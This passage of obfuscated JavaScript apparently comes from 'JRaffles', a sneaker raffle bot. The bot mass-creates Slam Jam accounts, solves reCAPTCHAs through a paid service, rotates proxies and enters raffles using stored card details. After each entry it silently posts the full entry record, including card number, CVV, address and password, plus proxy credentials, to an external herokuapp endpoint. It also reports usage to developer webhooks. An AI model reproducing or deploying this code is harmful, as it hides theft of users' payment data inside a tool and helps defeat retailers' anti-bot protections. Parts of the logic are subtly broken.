                            }), await _0x4724b3['goto']('https://drop.slamjam.com/account/register'), await _0x505897(0xbb8), await _0x4724b3['waitForSelector']('#FirstName'), await _0x4724b3['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4724b3['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x3b5c2b() + '\x20[' + _0x4b3aa5['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Filling\x20information'), await _0x505897(0x4b0), await _0x4724b3['type']('#FirstName', '' + _0x4bc4fd[_0x503ce2]['FirstName']), await _0x505897(0x226), await _0x4724b3['type']('#LastName', '' + _0x4bc4fd[_0x503ce2]['LastName']), await _0x505897(0x226), await _0x4724b3['type']('#Email', '' + _0x4bc4fd[_0x503ce2]['Email']), await _0x505897(0x2ee), await _0x4724b3['type']('#ConfirmEmail', '' + _0x4bc4fd[_0x503ce2]['Email']), await _0x505897(0x2ee), await _0x4724b3['type']('#CreatePassword', '' + _0x4bc4fd[_0x503ce2]['Password']), await _0x505897(0x2ee), await _0x4724b3['type']('#CreateConfirmPassword', '' + _0x4bc4fd[_0x503ce2]['Password']), await _0x505897(0x226), console['log'](_0x3b5c2b() + '\x20[' + _0x4b3aa5['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Submitting..'), await _0x4724b3['$eval']('#create_customer', _0x439013 => _0x439013['submit']()), await _0x505897(0x1388), console['log'](_0x3b5c2b() + '\x20[' + _0x4b3aa5['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20' + _0x4e59da['cyan']('Solving\x20Captcha')), await _0x4724b3['solveRecaptchas'](), console['log'](_0x3b5c2b() + '\x20[' + _0x4b3aa5['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x4724b3['$eval']('.shopify-challenge__container\x20>\x20form', _0x3d44c8 => _0x3d44c8['submit']());
                            try {
                                await _0x4724b3['waitForSelector']('.product-card__image'), await _0x505897(0x1f4), _0x52f5cd = 'no', console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x4b3aa5['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Account\x20' + _0x4bc4fd[_0x503ce2]['Email'] + '\x20Generated!')), _0x5d8933['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x4bc4fd[_0x503ce2]['Email'] + ',' + _0x4bc4fd[_0x503ce2]['Password']), console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x4b3aa5['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Account\x20' + _0x4bc4fd[_0x503ce2]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x3d89d7['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1abce0(_0x3faf08, _0x3d89d7['succesDEVMSG']);
                            } catch (_0xb1916f) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0xb1916f));
                            }
                        } catch (_0x5aac3e) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20' + _0x5aac3e));
                        } finally {
                            _0x1a90a6 && _0x1a90a6['close']();
                            if (_0x52f5cd == 'yes' && _0x411bd6 != 0x5) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x4b3aa5['name'] + ']\x20Task\x20' + (_0x503ce2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x411bd6 + '\x20/\x205)')), _0x503ce2 = _0x503ce2 - 0x1, _0x411bd6 = _0x411bd6 + 0x1;
                                continue;
                            }
                            _0x52f5cd == 'yes' && _0x411bd6 >= 0x5 && (_0x260c2d(_0x4bc4fd[_0x503ce2], _0x4b3aa5), _0x52f5cd = 'no', _0x411bd6 = 0x0), console['log']('Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x101369, _0x51368b, _0x5c2802) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x26adc5 = 0x0; _0x26adc5 < _0x51368b['length']; _0x26adc5++) {
                        var _0x576135;
                        if (_0x296356 != 'yes')
                            var _0x296356 = '', _0x169a1a = 0x0;
                        _0x4041fe(_0x101369['name'] + '\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20/\x20' + _0x51368b['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        try {
                            await _0x43797b(_0x51368b, _0x26adc5);
                        } catch {
                            _0x296356 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x51368b[_0x26adc5]['Email'] == '' || _0x51368b[_0x26adc5]['Password'] == '' || _0x51368b[_0x26adc5]['FirstName'] == '' || _0x51368b[_0x26adc5]['LastName'] == '') {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4acd48['useRandomProxy'] = ![])
                            var _0x321c94 = _0x5c2802[_0x26adc5]['split'](':');
                        else
                            var _0x45b424 = Math['round'](Math['random']() * (_0x5c2802['length'] - 0x1)), _0x321c94 = _0x5c2802[_0x45b424]['split'](':');
                        var _0xac87f8;
                        try {
                            _0xac87f8 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x321c94[0x0] + ':' + _0x321c94[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xac87f8 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x321c94[0x0] + ':' + _0x321c94[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1b5086 = await _0xac87f8['newPage']();
                            await _0x1b5086['authenticate']({
                                'username': '' + _0x321c94[0x2],
                                'password': '' + _0x321c94[0x3]
                            }), await _0x1b5086['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1b5086['setRequestInterception'](!![]), _0x1b5086['on']('request', _0x367393 => {
                                _0x367393['resourceType']() === 'image' || _0x367393['resourceType']() === 'font' || _0x367393['resourceType']() === 'media' ? _0x367393['abort']() : _0x367393['continue']();
                            }), await _0x1b5086['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1b5086['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1b5086['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x505897(0x258), await _0x1b5086['waitForSelector']('#CustomerEmail'), console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1b5086['type']('#CustomerEmail', '' + _0x51368b[_0x26adc5]['Email']), await _0x505897(0x12c), await _0x1b5086['type']('#CustomerPassword', '' + _0x51368b[_0x26adc5]['Password']), await _0x505897(0x226), await _0x1b5086['$eval']('#customer_login', _0x32c6f0 => _0x32c6f0['submit']()), await _0x505897(0x7d0), await _0x1b5086['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20' + _0x4e59da['cyan']('Solving\x20Captcha')), await _0x1b5086['solveRecaptchas'](), console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1b5086['$eval']('.shopify-challenge__container\x20>\x20form', _0x41d65a => _0x41d65a['submit']());
                            try {
                                await _0x1b5086['waitForSelector']('.nav-account'), await _0x505897(0x4b0);
                            } catch {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1b5086['goto']('' + _0x51368b[_0x26adc5]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x505897(0xbb8), console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1b5086['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x1b5086['click']('.product-select-variant-wrapper'), await _0x505897(0x320), await _0x1b5086['click']('li.product-select-variant__value[data-size=\x22' + _0x51368b[_0x26adc5]['Size'] + '\x22]'), await _0x505897(0x384), await _0x1b5086['$eval']('#AddToCartForm-product-template-raffle', _0x58b442 => _0x58b442['submit']()), await _0x1b5086['waitForSelector']('.cart-order-summary__content'), await _0x505897(0x514), await _0x1b5086['goto']('https://drop.slamjam.com/checkout'), await _0x505897(0x514), await _0x1b5086['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1b5086['select']('#checkout_shipping_address_country', '' + _0x51368b[_0x26adc5]['Country']), await _0x505897(0x200), await _0x1b5086['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1b5086['type']('#checkout_shipping_address_first_name', '' + _0x51368b[_0x26adc5]['FirstName']), await _0x505897(0x237), await _0x1b5086['type']('#checkout_shipping_address_last_name', '' + _0x51368b[_0x26adc5]['LastName']), await _0x505897(0x1e0), await _0x1b5086['type']('#checkout_shipping_address_address1', _0x51368b[_0x26adc5]['Address1'] + '\x20' + _0x51368b[_0x26adc5]['HouseNumber']), await _0x505897(0x514), await _0x1b5086['type']('#checkout_shipping_address_address2', '' + _0x51368b[_0x26adc5]['Address2']), await _0x505897(0x514);
                            _0x51368b[_0x26adc5]['Postcode'] == undefined && (_0x51368b[_0x26adc5]['Postcode'] = _0x51368b[_0x26adc5]['Zip']);
                            await _0x1b5086['type']('#checkout_shipping_address_zip', '' + _0x51368b[_0x26adc5]['Postcode']), await _0x505897(0x2bc), await _0x1b5086['type']('#checkout_shipping_address_city', '' + _0x51368b[_0x26adc5]['City']), await _0x505897(0x320), await _0x1b5086['type']('#checkout_shipping_address_phone', '' + _0x51368b[_0x26adc5]['Phone']), await _0x505897(0x320), await _0x1b5086['click']('#continue_button'), await _0x505897(0xbb8), await _0x1b5086['waitForSelector']('.summary-title'), await _0x505897(0x320), await _0x1b5086['click']('#continue_button'), await _0x505897(0x320), console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1b5086['waitForSelector']('#checkout_credit_card_vault'), await _0x505897(0x3e8);
                            var _0x340ef3 = await _0x1b5086['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x50376b = await _0x340ef3['contentFrame']();
                            await _0x50376b['click']('#number'), await _0x505897(0x3e8), await _0x50376b['type']('#number', '' + _0x51368b[_0x26adc5]['CardNumber'], { 'delay': 0x78 }), _0x340ef3 = await _0x1b5086['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x50376b = await _0x340ef3['contentFrame'](), await _0x505897(0x1c2), await _0x50376b['click']('#name'), await _0x505897(0x1f4), await _0x50376b['type']('#name', '' + _0x51368b[_0x26adc5]['NameOnCard'], { 'delay': 0x78 }), _0x340ef3 = await _0x1b5086['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x50376b = await _0x340ef3['contentFrame'](), await _0x505897(0x1c2), await _0x50376b['click']('#expiry'), await _0x505897(0x1f4), await _0x50376b['type']('#expiry', '' + _0x51368b[_0x26adc5]['ExpiryDate'], { 'delay': 0x78 }), _0x340ef3 = await _0x1b5086['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x50376b = await _0x340ef3['contentFrame'](), await _0x505897(0x1c2), await _0x50376b['click']('#verification_value'), await _0x505897(0x1f4), await _0x50376b['type']('#verification_value', '' + _0x51368b[_0x26adc5]['CVV'], { 'delay': 0x78 }), await _0x1b5086['$eval']('#accepts-flag-raffle', _0x1f81b3 => _0x1f81b3['click']()), await _0x505897(0x7d0), console['log'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1b5086['$eval']('#continue_button', _0x11361a => _0x11361a['click']()), await _0x505897(0x1b58), await _0x1b5086['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1b5086['$eval']('.edit_checkout.animate-floating-labels', _0x3c92df => _0x3c92df['submit']()), await _0x505897(0x7d0);
                            try {
                                await _0x1b5086['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x296356 = 'no', _0x11df74(_0x51368b[_0x26adc5], _0x101369), console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x137dfb) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x137dfb['message']);
                            }
                            var _0x5b0edf = await _0x429bf8(_0x51368b[_0x26adc5], _0x101369, 'dev', ![]), _0xf35e85 = await _0x429bf8(_0x51368b[_0x26adc5], _0x101369, 'pub', ![]);
                            let _0x7c4459 = _0x51368b[_0x26adc5];
                            try {
                                prxdata = {
                                    'username': _0xdaef84['replace']('#', ''),
                                    'module': _0x101369['name'],
                                    'entrydata': JSON['stringify'](_0x7c4459),
                                    'proxy': '' + _0x5c2802[_0x26adc5]
                                };
                                var _0x8949c0 = JSON['stringify'](prxdata);
                                let _0x3242b6 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x8949c0, _0x3242b6);
                            } catch (_0x49f550) {
                            }
                            const _0x360352 = {
                                'succesDEVMSG': { 'embeds': [_0x5b0edf] },
                                'succesPUBMSG': { 'embeds': [_0xf35e85] }
                            };
                            try {
                                _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x360352['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x360352['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x1b595f, _0x360352['succesPUBMSG']);
                            } catch (_0x244fd7) {
                                console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x244fd7));
                            }
                        } catch (_0x1f678a) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x5f28dd[taskModule]['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20' + _0x1f678a)), _0x576135 = '' + _0x1f678a;
                            var _0x1ebc28 = await _0x429bf8(kickz[_0x26adc5], _0x101369, 'dev', !![], _0x576135);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x1ebc28] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], EMBEDS['errorDEV']), await _0x1abce0(_0x3b044a, EMBEDS['errorDEV']), _0x296356 = 'yes';
                        } finally {
                            _0xac87f8 && _0xac87f8['close']();
                            if (_0x296356 == 'yes' && _0x169a1a != 0x5 && _0x576135 != 'Size\x20Not\x20Found') {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x101369['name'] + ']\x20Task\x20' + (_0x26adc5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x169a1a + '\x20/\x205)')), _0x26adc5 = _0x26adc5 - 0x1, _0x169a1a = _0x169a1a + 0x1;
                                continue;
                            }
                            _0x296356 == 'yes' && _0x169a1a >= 0x5 && (_0x260c2d(_0x51368b[_0x26adc5], _0x101369), _0x296356 = 'no', _0x169a1a = 0x0), console['log']('Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x4e39a7) {
                    var _0x293074 = await _0x2ab53c(), _0xd97344 = _0x5d8933['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3ef3f1 = _0x4d4612['parse'](_0xd97344, { 'header': !![] })['data'];
                    for (var _0x54c6cf = 0x0; _0x54c6cf < _0x3ef3f1['length']; _0x54c6cf++) {
                        var _0x19c274 = _0x3ef3f1[_0x54c6cf]['Store'], _0x656fa4 = _0x3ef3f1[_0x54c6cf]['Mode'];
                        for (var _0x6992e1 of _0x5f28dd) {
                            const _0x204cfc = _0x6992e1['name']['includes'](_0x19c274);
                            if (!_0x204cfc)
                                continue;
                            for (mode of _0x6992e1['modules']) {
                                if (mode['name'] == _0x656fa4) {
                                    console['log']('Running\x20' + _0x4e59da['cyan'](mode['name'])), await mode['function'](mode, [_0x3ef3f1[_0x54c6cf]], _0x293074);
                                    var _0x3f0572 = _0xd97344['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x5d8933['writeFileSync']('../failed-tasks.csv', _0x3f0572);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x26bceb = await _0x39af6d['get']('Answer');
                    if (_0x26bceb['Answer']['toLowerCase']() == 'y') {
                        _0x5d8933['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x505897(0x3e8);
                        return;
                    }
                    if (_0x26bceb['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x505897(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x505897(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x1e966e(_0x5f5103) {
    var _0x2a063a = await _0x2ab53c(), _0x8085ef = _0x5d8933['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x276086 = _0x4d4612['parse'](_0x8085ef, { 'header': !![] })['data'];
    for (var _0x14dd6b = 0x0; _0x14dd6b < _0x276086['length']; _0x14dd6b++) {
        var _0x2d6d57 = _0x276086[_0x14dd6b]['Store'], _0xf2c37f = _0x276086[_0x14dd6b]['Mode'];
        for (var _0x39ec22 of _0x5f28dd) {
            const _0x78ea79 = _0x39ec22['name']['includes'](_0x2d6d57);
            if (_0x78ea79)
                for (mode of _0x5f28dd[_0x39ec22]['modules']) {
                    const _0x12adfa = mode['name']['includes'](_0xf2c37f);
                    _0x12adfa && (_0x5f5103 = mode['name'], await mode['function'](_0x5f5103, _0x276086[_0x14dd6b], _0x2a063a));
                }
        }
    }
}
async function _0x4dc431() {
    await _0x224931(), console['clear']();
    if (_0x5d34b4 != 'devkey') {
        let _0x471281 = await _0x12d6a2['autoUpdate']();
        if (_0x471281 === 'yes')
            return _0x54797d('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1b7d51 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x505897(0x2710);
        ;
    }
    await _0x1c356a(_0x1b7d51);
    if (_0x3e2716 === ![])
        return console['log']('Closing\x20Browser'), await _0x505897(0xbb8);
    else
        try {
            var _0x1865eb = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0xdaef84
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5d34b4
                    }
                ]
            }];
            const _0x7cc340 = { 'embeds': _0x1865eb };
            var _0x5e86ee = await _0x429bf8(null, null, 'open', ![]);
            const _0x2bc4b2 = { 'openDEVMSG': { 'embeds': [_0x5e86ee] } };
            await _0x1abce0(_0x6379d0, _0x2bc4b2['openDEVMSG']);
            async function _0xe2bae3() {
                _0x4041fe('JRaffles\x20' + _0x5d34b4), console['clear'](), console['log']('Welcome\x20' + _0x4e59da['cyan']('' + _0xdaef84)), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x102227 = 0x0; _0x102227 < _0x5f28dd['length'] - 0x4; _0x102227++) {
                    if (_0x102227 >= 0xa) {
                        console['log']('\x20(' + _0x102227 + ')\x20[' + _0x5f28dd[_0x102227]['name'] + ']');
                        continue;
                    }
                    if (_0x5f28dd[_0x102227]['name'] === 'Reload\x20Settings' || _0x5f28dd[_0x102227]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x102227 + ')\x20\x20[' + _0x5f28dd[_0x102227]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x5f28dd['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x5f28dd['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x5f28dd['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x5f28dd['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x51b098();
                if (taskModule > _0x5f28dd['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x505897(0x3e8), _0xe2bae3();
                if (_0x5f28dd[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                    var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x513f69 = await _0x2ab53c();
                            await _0x4e95b5['function'](_0x4e95b5, _0x513f69);
                        }
                        if (taskFunction == 0x2) {
                            var _0x513f69 = await _0x2ab53c(), _0x4777e8 = await _0x1a71aa();
                            _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x4777e8), await _0x4e95b5['function'](_0x4e95b5, _0x4777e8, _0x513f69);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x513f69 = await _0x2ab53c(), _0x4777e8 = await _0x1a71aa();
                                _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x4777e8), await _0x4e95b5['function'](_0x4e95b5, _0x4777e8, _0x513f69);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x513f69 = await _0x2ab53c();
                                    await _0x4e95b5['function'](_0x4e95b5, _0x513f69);
                                }
                            }
                        }
                    } catch (_0x2c9872) {
                        console['log'](_0x2c9872), await _0x505897(0x7d0);
                    }
                    return _0xe2bae3();
                }
                if (_0x5f28dd[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                        var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x513f69 = await _0x2ab53c(), _0x22cd68 = await _0x1a71aa();
                            _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x22cd68), await _0x4e95b5['function'](_0x4e95b5, _0x22cd68, _0x513f69);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x513f69 = await _0x2ab53c(), _0x22cd68 = await _0x1a71aa();
                                _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x22cd68), await _0x4e95b5['function'](_0x4e95b5, _0x22cd68, _0x513f69);
                            }
                        }
                    } catch (_0x143ec7) {
                        console['log'](_0x143ec7), await _0x505897(0xfa0);
                    }
                    return _0xe2bae3();
                }
                if (_0x5f28dd[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                    var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x513f69 = await _0x2ab53c();
                        return await _0x4e95b5['function'](_0x4e95b5, _0x513f69), _0xe2bae3();
                    }
                    var _0x513f69 = await _0x2ab53c(), _0x1b2f8b = await _0x1a71aa();
                    return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x1b2f8b), await _0x4e95b5['function'](_0x4e95b5, _0x1b2f8b, _0x513f69), _0xe2bae3();
                }
                if (_0x5f28dd[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                    var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x513f69 = await _0x2ab53c(), _0x1b2f8b = await _0x1a71aa();
                    return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x1b2f8b), await _0x4e95b5['function'](_0x4e95b5, _0x1b2f8b, _0x513f69), _0xe2bae3();
                }
                if (_0x5f28dd[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                    var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x513f69 = await _0x2ab53c(), _0x1b2f8b = await _0x1a71aa();
                    return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x1b2f8b), await _0x4e95b5['function'](_0x4e95b5, _0x1b2f8b, _0x513f69), _0xe2bae3();
                }
                if (_0x5f28dd[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                    var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x513f69 = await _0x2ab53c(), _0x1b2f8b = await _0x1a71aa();
                    return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x1b2f8b), await _0x4e95b5['function'](_0x4e95b5, _0x1b2f8b, _0x513f69), _0xe2bae3();
                } else {
                    if (_0x5f28dd[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                        var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x513f69 = await _0x2ab53c(), _0x1064f9 = await _0x1a71aa();
                            return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x1064f9), await _0x4e95b5['function'](_0x4e95b5, _0x1064f9, _0x513f69), _0xe2bae3();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x513f69 = await _0x2ab53c();
                                return await _0x4e95b5['function'](_0x4e95b5, null, _0x513f69), _0xe2bae3();
                            }
                        }
                        ;
                    } else {
                        if (_0x5f28dd[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                            var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction], _0x513f69 = await _0x2ab53c(), _0x400699 = await _0x1a71aa();
                            return _0x4acd48['shuffleTasks'] && await _0x5598e4(_0x400699), await _0x4e95b5['function'](_0x4e95b5, _0x400699, _0x513f69), await _0x505897(0x1388), _0xe2bae3();
                        } else {
                            if (_0x5f28dd[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x6885a(_0x5f28dd[taskModule]['modules']);
                                var _0x4e95b5 = _0x5f28dd[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x513f69 = await _0x2ab53c(), _0x1064f9 = await _0x1a71aa();
